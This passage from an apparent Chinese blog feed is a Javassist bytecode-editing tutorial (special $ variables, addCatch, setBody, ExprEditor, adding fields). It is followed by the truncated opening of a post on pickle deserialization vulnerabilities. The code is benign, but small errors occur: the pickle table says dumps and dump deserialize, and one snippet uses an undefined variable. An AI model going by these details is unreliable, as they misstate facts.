<h4 id="sig"><a href="#sig" class="headerlink" title="$sig"></a>$sig</h4><p><code>$sig</code> 的值是一个 java.lang.Class 对象的数组，表示声明的形式参数类型。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">m.insertBefore(<span class="string">&quot;&#123;System.out.println(java.util.Arrays.toString($sig));&#125;&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>产生的class内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">System.out.println(Arrays.toString(Desc.getParams(&quot;(II)&quot;)));</span><br></pre></td></tr></table></figure></div>

<p>输出的是个 Class 数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[int,int]</span><br></pre></td></tr></table></figure></div>

<p>getParams 是 javassist.runtime.Desc 包下的，该方法接受一个方法描述符作为参数，然后返回一个字符串数组，其中包含了描述该方法参数类型的字符串。</p>
<p>该方法会解析方法描述符，提取出其中的参数类型信息，并将其转换为字符串数组返回。</p>
<ul>
<li><code>B</code>: byte 类型</li>
<li><code>C</code>: char 类型</li>
<li><code>D</code>: double 类型</li>
<li><code>F</code>: float 类型</li>
<li><code>I</code>: int 类型</li>
<li><code>J</code>: long 类型</li>
<li><code>S</code>: short 类型</li>
<li><code>Z</code>: boolean 类型</li>
<li><code>L&lt;full-classname&gt;;</code>: 对象引用类型，其中 <code>&lt;full-classname&gt;</code> 是类的完整路径名</li>
<li><code>[</code>: 数组类型</li>
</ul>
<p>所以上面转化的class文件中以下内容，实际上就是返回的是包含两个 int 类型的数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Desc.getParams(&quot;(II)&quot;)</span><br></pre></td></tr></table></figure></div>



<h4 id="type"><a href="#type" class="headerlink" title="$type"></a>$type</h4><p>$type 的值是一个 java.lang.Class 对象，表示函数返回值的类型。 如果这是一个构造函数，此变量返回 Void.class。</p>
<p>和上面的 <code>$sig</code> 差不多，但是其调用的方法是 Desc.getType，比如 Desc.getType(“V”) 表示的返回值类型是 void</p>
<h4 id="class"><a href="#class" class="headerlink" title="$class"></a>$class</h4><p>用于引用当前正在编辑的类的类型，通常在添加字段或方法时使用。与 <code>$0</code> 有点相似</p>
<h4 id="e，addCatch"><a href="#e，addCatch" class="headerlink" title="$e，addCatch()"></a><code>$e</code>，addCatch()</h4><p> 在插入的源代码中，异常用 $e 表示。</p>
<p>测试代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;word&quot;</span>);</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">etype</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;java.io.IOException&quot;</span>);</span><br><span class="line">       m.addCatch(<span class="string">&quot;&#123; System.out.println($e); throw $e; &#125;&quot;</span>, etype);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>写入的class 内容如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">word</span><span class="params">()</span> &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;	<span class="comment">// 原本的内容</span></span><br><span class="line">       &#125; <span class="keyword">catch</span> (IOException var2) &#123;</span><br><span class="line">           System.out.println(var2);</span><br><span class="line">           <span class="keyword">throw</span> var2;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以发现原本的类方法在 try 块中，而通过 addCatch 的内容添加在了 catch 块中。</p>
<p>还需要注意，插入的代码片段必须以 throw 或 return 语句结束。</p>
<h3 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h3><p>CtMethod 和 CtConstructor 提供 setBody() 来替换整个方法体。他将新的源代码编译成 Java  字节码，并用它替换原方法体。 如果给定的源文本为 null，则替换后的方法体仅包含返回语句，返回零或空值，除非结果类型为 void。</p>
<p>在传递给 setBody() 的源代码中，以 $ 开头的标识符也具有特殊含义，处理方式与上面的提到的内容一致（但是 <code>$_</code> 不可用）。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G5_CtMethod_Learn_SetBody</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">            System.out.println(a + b);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_SetBody$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        m.setName(<span class="string">&quot;mul&quot;</span>);</span><br><span class="line">        m.setBody(<span class="string">&quot;&#123;System.out.println($1 * $2);&#125;&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> aClass.newInstance();</span><br><span class="line">        aClass.getDeclaredMethod(<span class="string">&quot;mul&quot;</span>, <span class="type">int</span>.class, <span class="type">int</span>.class).invoke(instance, <span class="number">10</span>, <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="替换表达式"><a href="#替换表达式" class="headerlink" title="替换表达式"></a>替换表达式</h3><h4 id="javassist-expr-MethodCall"><a href="#javassist-expr-MethodCall" class="headerlink" title="javassist.expr.MethodCall"></a>javassist.expr.MethodCall</h4><p>Javassist 只允许修改方法体中包含的表达式。javassist.expr.ExprEditor 是一个用于替换方法体中的表达式的类。用户可以定义 ExprEditor 的子类来指定修改表达式的方式。</p>
<p>要运行 ExprEditor 对象，用户必须在 CtMethod 或 CtClass 中调用 instrument()。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">       <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">           System.out.println(a + b);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">           System.out.println(a);</span><br><span class="line">           <span class="keyword">return</span> a*a;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;square&quot;</span>);</span><br><span class="line">       m.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(MethodCall mc)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">               mc.replace(<span class="string">&quot;&#123; System.out.println(\&quot;&quot;</span>+mc.where().getName()+<span class="string">&quot;调用&quot;</span>+mc.getClassName()+<span class="string">&quot;类的方法: &quot;</span>+mc.getMethodName() +<span class="string">&quot;\&quot;);$1 = 10; $_ = $proceed($$); &#125;&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">       Class&lt;?&gt; aClass = cc.toClass();</span><br><span class="line">       <span class="type">Test</span> <span class="variable">instance</span> <span class="operator">=</span> (Test)aClass.getDeclaredConstructor().newInstance();</span><br><span class="line">       System.out.println(instance.square(<span class="number">5</span>));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里需要注意的是，这个方式修改的是调用的方法中存在的其他方法。比如上面代码寻找的是 square 方法，修改了 println 方法，也就是这个方法内的其他方法，$1 也是 println 的第一个参数，而不是 square 的第一个参数，这个需要注意一下；如果需要访问当前调用的方法名称，可以通过 <code>.where().getName()</code> 获取，比如上面的代码运行结果为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">square调用java.io.PrintStream类的方法: println</span><br><span class="line"><span class="number">10</span>		<span class="comment">// $1 只修改了 println 的第一个参数的值，而不是修改的 a 的值</span></span><br><span class="line"><span class="number">25</span>		<span class="comment">// 这个是 square 的返回值，可以发现实际上传入的 a 值并没有变</span></span><br></pre></td></tr></table></figure></div>

<p> 调用 edit() 参数的 replace() 方法可以将表达式替换为我们给定的语句。如果给定的语句是空块，即执行replace(“{}”)，则将表达式删除。如果要在表达式之前或之后插入语句（或块），则应该将类似以下的代码传递给 replace()：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; *before-statements;*</span><br><span class="line">  $_ = $proceed($$);</span><br><span class="line">  *after-statements;* &#125;</span><br></pre></td></tr></table></figure></div>

<p>直接点说也就是不想改的部分记得照写。</p>
<p>上述代码中的 MethodCall 类的 replace 方法和之前接触的 CtMethod 方法中 <code>$</code>  的作用是一样的（$0 表示方法调用的目标对象。它不等于 this，它代表了调用者。 如果方法是静态的，则 $0 为 null）。</p>
<p>除了 MethodCall 类，ExprEditor 的 edit 其实有许多的重构方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240308144738048.png"
                      alt="image-20240308144738048"
                ></p>
<h4 id="javassist-expr-ConstructorCall"><a href="#javassist-expr-ConstructorCall" class="headerlink" title="javassist.expr.ConstructorCall"></a><strong>javassist.expr.ConstructorCall</strong></h4><p>ConstructorCall 表示构造函数调用，ConstructorCall 中的方法 replace() 可以使用语句或代码块来代替构造函数。它接收表示替换语句或块的源代码。以 $ 开头的标识符同样具有特殊的含义，具体同上。</p>
<p>由于任何构造函数必须调用超类的构造函数或同一类的另一个构造函数，所以替换语句必须包含构造函数调用，通常是对 $proceed() 的调用。否则会出现如下报错：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Constructor must call <span class="title function_">super</span><span class="params">()</span> or <span class="title function_">this</span><span class="params">()</span> before <span class="keyword">return</span></span><br></pre></td></tr></table></figure></div>

<p>示例：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">    <span class="type">CtConstructor</span> <span class="variable">ctConstructor</span> <span class="operator">=</span> cc.getDeclaredConstructor(<span class="literal">null</span>);</span><br><span class="line">    ctConstructor.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(ConstructorCall cc)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">            cc.replace(<span class="string">&quot;&#123;System.out.println(\&quot;Hello Ko1sh1\&quot;);$proceed($$);&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">    cc.toClass().getDeclaredConstructor().newInstance();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        System.out.println(a + b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="keyword">return</span> a*a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="javassist-expr-FieldAccess"><a href="#javassist-expr-FieldAccess" class="headerlink" title="javassist.expr.FieldAccess"></a>javassist.expr.FieldAccess</h4><p>FieldAccess 对象表示字段访问。 如果找到对应的字段访问操作，ExprEditor 中的 edit() 方法将接收到一个 FieldAccess 对象。FieldAccess 中的 replace() 方法接收替源代码来替换字段访问。</p>
<p>在源代码中，以 $ 开头的标识符具有特殊含义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>表达式访问的字段。它不等于 this。this 表示调用表达式所在方法的对象。如果字段是静态的，则 $0 为 null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>如果表达式是写操作，则写的值将保存在 $1中，否则 $1 不可用</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>如果表达式是读操作，则结果值需要保存在 $_ 中的值，否则将舍弃 $_ 的值</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>如果表达式是读操作，则 $r 表示读取的类型，否则 $r 为 void</td>
</tr>
<tr>
<td><code>$class</code></td>
<td>一个 java.lang.Class 对象，表示字段所在的类</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示字段的类型</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行原始字段访问的虚拟方法的名称</td>
</tr>
</tbody></table>
<p>测试代码：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">       <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">       <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G5_CtMethod_Learn_EditBody$Test&quot;</span>);</span><br><span class="line">       <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> cc.getDeclaredMethod(<span class="string">&quot;fieldTest&quot;</span>);</span><br><span class="line">       m.instrument(<span class="keyword">new</span> <span class="title class_">ExprEditor</span>() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">edit</span><span class="params">(FieldAccess fa)</span> <span class="keyword">throws</span> CannotCompileException &#123;</span><br><span class="line">               <span class="comment">// 如果是写操作</span></span><br><span class="line">               <span class="keyword">if</span> (fa.isWriter()) &#123;</span><br><span class="line">                   fa.replace(<span class="string">&quot;&#123;System.out.println(\&quot;写入的值是：\&quot;+$1);&#125;&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="comment">// 如果是读操作</span></span><br><span class="line">               <span class="keyword">if</span> (fa.isReader()) &#123;</span><br><span class="line">                   fa.replace(<span class="string">&quot;&#123;System.out.println($_=\&quot;&quot;</span>+fa.getFieldName()+<span class="string">&quot;被读取\&quot;); &#125;&quot;</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       cc.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">       <span class="type">Test</span> <span class="variable">instance</span> <span class="operator">=</span> (Test)cc.toClass().getDeclaredConstructor().newInstance();</span><br><span class="line">       instance.fieldTest();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">       <span class="keyword">private</span> String name;</span><br><span class="line">       <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">           System.out.println(a + b);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">int</span> <span class="title function_">square</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">           System.out.println(a);</span><br><span class="line">           <span class="keyword">return</span> a*a;</span><br><span class="line">       &#125;</span><br><span class="line">       String <span class="title function_">fieldTest</span><span class="params">()</span>&#123;</span><br><span class="line">           <span class="built_in">this</span>.name = <span class="string">&quot;Ko1sh1&quot;</span>;</span><br><span class="line">           <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="javassist-expr-NewExpr"><a href="#javassist-expr-NewExpr" class="headerlink" title="javassist.expr.NewExpr"></a>javassist.expr.NewExpr</h4><p>NewExpr 表示使用 new 运算符（不包括数组创建）创建对象的表达式。 如果发现创建对象的操作，NewEditor 中的 edit() 方法将接收到一个 NewExpr 对象。NewExpr 中的 replace() 方法接收替源代码来替换字段访问。</p>
<h4 id="javassist-expr-NewArray"><a href="#javassist-expr-NewArray" class="headerlink" title="javassist.expr.NewArray"></a>javassist.expr.NewArray</h4><p>NewArray 表示使用 new 运算符创建数组。如果发现数组创建的操作，ExprEditor 中的 edit() 方法一个 NewArray 对象。NewArray 中的 replace() 方法可以使用源代码来替换数组创建操作。</p>
<p>$ 开头的符号存在部分不同含义</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code>, <code>$1</code></td>
<td>每一维的大小</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>创建数组的返回值。一个新的数组对象存储在 $_ 中</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>所创建的数组的类型</td>
</tr>
</tbody></table>
<p>比如按下面的方式创建数组</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[][] s = new String[3][4];</span><br></pre></td></tr></table></figure></div>

<p>那么$1、$2 分别是 3 和 4，$3 不可用。（如果创建的时候省略了最后一维的维度，那么最后一维也不可用）</p>
<h4 id="javassist-expr-Instanceof"><a href="#javassist-expr-Instanceof" class="headerlink" title="javassist.expr.Instanceof"></a>javassist.expr.Instanceof</h4><p>一个 InstanceOf 对象表示一个 instanceof 表达式。 如果找到 instanceof 表达式，则ExprEditor 中的 edit() 方法接收此对象。Instanceof 中的 replace() 方法可以使用源代码来替换 instanceof 表达式。</p>
<p>以$开头的标识符具有特殊含义</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>instanceof 运算符左侧的值</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>表达式的返回值。类型为 boolean</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>instanceof 运算符右侧的值</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示 instanceof 运算符右侧的类型</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行 instanceof 表达式的虚拟方法的名称。它需要一个参数（类型是 java.lang.Object）。如果参数类型和 instanceof 表达式右侧的类型一致，则返回 true。否则返回 false。</td>
</tr>
</tbody></table>
<p>javassist.expr.Cast</p>
<p>Cast 表示 cast 表达式。如果找到 cast 表达式，ExprEditor 中的 edit() 方法会接收到一个 Cast 对象。 Cast 的 replace() 方法可以接收源代码来替换替换 cast 表达式。</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$0</code></td>
<td>null</td>
</tr>
<tr>
<td><code>$1</code></td>
<td>显示类型转换的目标类型</td>
</tr>
<tr>
<td><code>$_</code></td>
<td>表达式的结果值。$_ 的类型和被括号括起来的类型相同</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>转换之后的类型，即被括号括起来的类型</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，和 $r 的类型相同</td>
</tr>
<tr>
<td><code>$proceed</code></td>
<td>执行类型转换的虚拟方法的名称。它需要一个参数（类型是 java.lang.Object）。并在类型转换完成后返回它</td>
</tr>
</tbody></table>
<p>javassist.expr.Handler</p>
<p>Handler 对象表示 try-catch 语句的 catch 子句。 如果找到 catch，ExprEditor 中的 edit() 方法会接收此对象。 Handler 中的 insertBefore() 方法会将收到的源代码插入到 catch 子句的开头。</p>
<p>在源文本中，以$开头的标识符具有意义：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td><code>$1</code></td>
<td>catch 分支获得的异常对象</td>
</tr>
<tr>
<td><code>$r</code></td>
<td>catch 分支获得的异常对象的类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$w</code></td>
<td>包装类型，用于强制类型转换</td>
</tr>
<tr>
<td><code>$type</code></td>
<td>一个 java.lang.Class 对象，表示 catch 捕获的异常的类型</td>
</tr>
</tbody></table>
<p>如果一个新的异常分配给 $1，它将作为捕获的异常传递给原始的 catch 子句。</p>
<h2 id="CtField-添加字段"><a href="#CtField-添加字段" class="headerlink" title="CtField 添加字段"></a>CtField 添加字段</h2><p>Javassist 还允许用户创建一个新字段。其中，可以通过 <code>setModifiers</code> 设置修饰类型，addField 的第二个参数表示计算初始值的表达式。这个表达式可以是任意 Java 表达式，只要其结果与字段的类型匹配。 请注意，表达式不以分号结尾。如不写第二个参数，则使用默认值。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtField;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">G6_CtFieldTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;G6_CtFieldTest$Test&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">cf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="type">int</span>.class.getName()), <span class="string">&quot;name&quot;</span>, ctClass);</span><br><span class="line">        cf.setModifiers(javassist.Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(cf,<span class="string">&quot;5+5&quot;</span>);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;javassist_learn/src/main/java/class_repository&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Test</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Test</span><span class="params">()</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>类变为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">G6_CtFieldTest$Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">name</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> G6_CtFieldTest$Test() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面的方法也可以简写为：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;G6_CtFieldTest$Test&quot;</span>);</span><br><span class="line"><span class="type">CtField</span> <span class="variable">f</span> <span class="operator">=</span> CtField.make(<span class="string">&quot;public int z = 0;&quot;</span>, ctClass);</span><br><span class="line">point.addField(f);</span><br></pre></td></tr></table></figure></div>



<h2 id="删除成员"><a href="#删除成员" class="headerlink" title="删除成员"></a>删除成员</h2><p>要删除字段或方法，可以使用 CtClass 的 removeField() 或 removeMethod() 方法。 一个CtConstructor 可以通过 CtClass 的 removeConstructor() 删除。</p>
<h2 id="导包"><a href="#导包" class="headerlink" title="导包"></a>导包</h2><p>需要导入的所有类名都必须是完整的（必须包含包名，java.lang 除外）。例如，Javassist 编译器可以解析 Object 以及 java.lang.Object。</p>
<p>ClassPool中 调用 importPackage() 可以告诉编译器在解析类名时搜索其他包。 例如，</p>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.importPackage(<span class="string">&quot;java.awt&quot;</span>);</span><br><span class="line">CtClass cc = pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">CtField f = CtField.<span class="built_in">make</span>(<span class="string">&quot;public Point p;&quot;</span>, cc);</span><br><span class="line">cc.addField(f);</span><br></pre></td></tr></table></figure></div>

<p>第二行导入了 java.awt 包。 因此，第三行不会抛出异常。 编译器可以将 Point 识别为java.awt.Point。</p>
<p>注意 importPackage() 不会影响 ClassPool 中的 get() 方法。只有编译器才考虑导入包。 get()  的参数必须是完整类名。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle 反序列化漏洞</title>
    <url>/2023/05/11/blog_pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>pickle是python语言的一个标准模块，实现了基本的数据序列化和反序列化。</strong><br><strong>pickle模块是以二进制的形式序列化后保存到文件中（保存文件的后缀为<code>.pkl</code>），不能直接打开进行预览。</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>dumps</td>
<td>对象反序列化为bytes对象</td>
</tr>
<tr>
<td>dump</td>
<td>对象反序列化到文件对象，存入文件</td>
</tr>
<tr>
<td>loads</td>
<td>从bytes对象反序列化</td>
</tr>
<tr>
<td>load</td>
